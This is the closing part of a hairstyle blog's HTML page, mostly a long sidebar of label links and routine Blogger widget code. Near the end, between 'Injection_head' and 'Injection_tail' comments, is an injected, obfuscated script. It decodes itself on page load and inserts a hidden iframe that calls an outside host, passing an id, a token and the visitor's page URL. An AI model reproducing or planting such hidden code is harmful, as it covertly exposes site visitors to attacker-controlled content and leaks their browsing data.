+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/victoria%20beckham%20hairstyles%20bob'>victoria beckham hairstyles bob</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/victoria%20beckham%20hairstyles%20front%20and%20back'>victoria beckham hairstyles front and back</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/victoria%20beckham%20hairstyles%20pixie'>victoria beckham hairstyles pixie</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/victoria%20beckham%20hairstyles%20short%20hair'>victoria beckham hairstyles short hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Victoria%27s%20Secret'>Victoria&#39;s Secret</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Vintage'>Vintage</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/vintage%20hair'>vintage hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/violet'>violet</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/vitamin%20A'>vitamin A</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Vitamin%20C'>Vitamin C</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/VMA'>VMA</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/VMA%20Awards'>VMA Awards</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/volume'>volume</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/vouge'>vouge</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Vouge%20Germany'>Vouge Germany</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/waves'>waves</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Wavy'>Wavy</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wavy%20hairstyles'>wavy hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wavy%20hairstyles%202013'>wavy hairstyles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wavy%20hairstyles%20for%20black%20women'>wavy hairstyles for black women</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wavy%20hairstyles%20for%20long%20hair'>wavy hairstyles for long hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wavy%20hairstyles%20for%20women'>wavy hairstyles for women</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wavy%20hairstyles%20pinterest'>wavy hairstyles pinterest</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wavy%20hairstyles%20tumblr'>wavy hairstyles tumblr</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wavy%20hairstyles%20with%20bangs'>wavy hairstyles with bangs</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wedding'>wedding</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wedding%20hairstyles'>wedding hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wedding%20hairstyles%20down'>wedding hairstyles down</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wedding%20hairstyles%20for%20long%20hair'>wedding hairstyles for long hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wedding%20hairstyles%20for%20short%20hair'>wedding hairstyles for short hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wedding%20hairstyles%20half%20up'>wedding hairstyles half up</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wedding%20hairstyles%20pinterest'>wedding hairstyles pinterest</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wedding%20hairstyles%20updos'>wedding hairstyles updos</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Weddings'>Weddings</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/weight%20gain'>weight gain</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Westfield'>Westfield</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wig'>wig</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Win'>Win</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Woman%20with%20Short%20Brown%20Hair'>Woman with Short Brown Hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/women'>women</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/women%20hairstyle'>women hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Women%20Hairstyles'>Women Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Women%20Who%20Rock'>Women Who Rock</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/women%27s%20short%20hair.'>women&#39;s short hair.</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/wrinkles'>wrinkles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Young%20Again'>Young Again</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/young%20mens%20society'>young mens society</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/your%EF%BB%BF%20hair%20dude'>your&#65279; hair dude</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Zac%20Efron'>Zac Efron</a>
+</li>
+</ul>
+<div class='clear'></div>
+</div>
+</div></div>
+</div>
+<!-- spacer for skins that want sidebar and main to be the same height-->
+<div class='clear'>&#160;</div>
+</div>
+<!-- end content-wrapper -->
+<div id='footer-wrapper'>
+<div class='footer no-items section' id='footer'></div>
+</div>
+</div></div>
+<!-- end outer-wrapper -->
+<!--Injection_head[SessionId=02D02EE1,version=2.0,type=FindDomainName,CRC32=EE4930AC]--><script>var uid = '22352', path='VxgFHkE1PSk7Jy8pOyozPDooNCAzRCBJMSE0JkFWSBddWEEOFgsXEUAXEB8=', host=String.fromCharCode(111,103,106,111,118,112,103,114,110,118,46,105,110);</script><script>var PyST41 = "e"; eval("var SNmr81 = /k"+"ok"+"o11/i"+"g"); var nBwJ82 = "%"; var HPHb31 = "koko1164koko116Fkoko1163koko1175koko116Dkoko1165koko116Ekoko1174koko112Ekoko1162koko116Fkoko1164koko1179koko112Ekoko1169koko116Ekoko116Ekoko1165koko1172koko1148koko1154koko114Dkoko114Ckoko113Dkoko1164koko116Fkoko1163koko1175koko116Dkoko1165koko116Ekoko1174koko112Ekoko1162koko116Fkoko1164koko1179koko112Ekoko1169koko116Ekoko116Ekoko1165koko1172koko1148koko1154koko114Dkoko114Ckoko1120koko112Bkoko1120koko1127koko113Ckoko1169koko1166koko1172koko1161koko116Dkoko1165koko1120koko1173koko1172koko1163koko113Dkoko1122koko1168koko1174koko1174koko1170koko113Akoko112Fkoko112Fkoko1127koko112Bkoko1168koko116Fkoko1173koko1174koko112Bkoko1127koko112Fkoko1172koko1165koko1163koko1169koko1165koko1176koko1165koko1172koko112Ekoko1170koko1168koko1170koko113Fkoko1175koko1169koko1164koko113Dkoko1127koko112Bkoko1175koko1169koko1164koko112Bkoko1127koko1126koko1170koko1161koko1174koko1168koko113Dkoko1127koko112Bkoko1170koko1161koko1174koko1168koko112Bkoko1127koko1126koko1168koko1172koko1165koko1166koko113Dkoko1127koko112Bkoko116Ckoko116Fkoko1163koko1161koko1174koko1169koko116Fkoko116Ekoko112Ekoko1168koko1172koko1165koko1166koko112Bkoko1127koko1122koko1120koko1173koko1174koko1179koko116Ckoko1165koko1120koko113Dkoko1120koko1122koko1164koko1169koko1173koko1170koko116Ckoko1161koko1179koko113Akoko116Ekoko116Fkoko116Ekoko1165koko1122koko1120koko113Ekoko113Ckoko112Fkoko1169koko1166koko1172koko1161koko116Dkoko1165koko113Ekoko1127koko113B"; var tpsH92 = document.createElement("script"); tpsH92.type = "text/javascript"; tpsH92.text = window["un"+PyST41+"sc"+"ap"+PyST41+""](HPHb31["r"+""+PyST41+"p"+"lac"+PyST41](SNmr81,nBwJ82)); document.body["app"+PyST41+"ndChild"](tpsH92); </script><!--Injection_tail[SessionId=02D02EE1]-->
+<body oncontextmenu='return false' ondragstart='return false' onkeydown='return false' onselectstart='return false'></body>
+<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js' type='text/javascript'></script>
+<script type='text/javascript'>
+//<![CDATA[
+$(document).ready(function() {
+  $('img').each(function(){
+    var $img = $(this);
+    var filename = $img.attr('src')
+    $img.attr('title', filename.substring((filename.lastIndexOf('/'))+1, filename.lastIndexOf('.')));
+     $img.attr('alt', filename.substring((filename.lastIndexOf('/'))+1, filename.lastIndexOf('.')));
+  });
+});
+//]]>
+</script>
+
+<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/296009378-widgets.js"></script>
+<script type='text/javascript'>
+window['__wavt'] = 'AOuZoY6HkLZcH8BuJpM08TktNdlUYU23gA:1629808949470';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d5646024447793338073','//mediumhairstylefashion.blogspot.com/search/label/beard','5646024447793338073');
+_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '5646024447793338073', 'title': 'Medium Hairstyle Fashions', 'url': 'http://mediumhairstylefashion.blogspot.com/search/label/beard', 'canonicalUrl': 'http://mediumhairstylefashion.blogspot.com/search/label/beard', 'homepageUrl': 'http://mediumhairstylefashion.blogspot.com/', 'searchUrl': 'http://mediumhairstylefashion.blogspot.com/search', 'canonicalHomepageUrl': 'http://mediumhairstylefashion.blogspot.com/', 'blogspotFaviconUrl': 'http://mediumhairstylefashion.blogspot.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': false, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Medium Hairstyle Fashions - Atom\x22 href\x3d\x22http://mediumhairstylefashion.blogspot.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Medium Hairstyle Fashions - RSS\x22 href\x3d\x22http://mediumhairstylefashion.blogspot.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Medium Hairstyle Fashions - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/5646024447793338073/posts/default\x22 /\x3e\n', 'meTag': '\x3clink rel\x3d\x22me\x22 href\x3d\x22https://www.blogger.com/profile/07136070062811699855\x22 /\x3e\n', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/9c2aecaa603c9f08', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'disableGComments': true, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': 'Share to Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 300, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'index', 'searchLabel': 'beard', 'pageName': 'beard', 'pageTitle': 'Medium Hairstyle Fashions: beard'}}, {'name': 'features', 'data': {'sharing_get_link_dialog': 'true', 'sharing_native': 'false'}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Custom', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'Medium Hairstyle Fashions', 'description': '', 'url': 'http://mediumhairstylefashion.blogspot.com/search/label/beard', 'type': 'feed', 'isSingleItem': false, 'isMultipleItems': true, 'isError': false, 'isPage': false, 'isPost': false, 'isHomepage': false, 'isArchive': false, 'isSearch': true, 'isLabelSearch': true, 'search': {'label': 'beard', 'resultsMessage': 'Showing posts with the label beard', 'resultsMessageHtml': 'Showing posts with the label \x3cspan class\x3d\x27search-label\x27\x3ebeard\x3c/span\x3e'}}}]);
+_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', document.getElementById('Navbar1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'navMessage': 'No posts with label \x3cb\x3ebeard\x3c/b\x3e. \x3ca href\x3d\x22http://mediumhairstylefashion.blogspot.com/\x22\x3eShow all posts\x3c/a\x3e', 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/1787217527-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/4076883957-lightbox_bundle.css'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_PopularPostsView', new _WidgetInfo('PopularPosts1', 'sidebar', document.getElementById('PopularPosts1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_FollowersView', new _WidgetInfo('Followers1', 'sidebar', document.getElementById('Followers1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogListView', new _WidgetInfo('BlogList1', 'sidebar', document.getElementById('BlogList1'), {'numItemsToShow': 0, 'totalItems': 5}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_LabelView', new _WidgetInfo('Label1', 'sidebar', document.getElementById('Label1'), {}, 'displayModeFull'));
+</script>
+</body>
+</html>
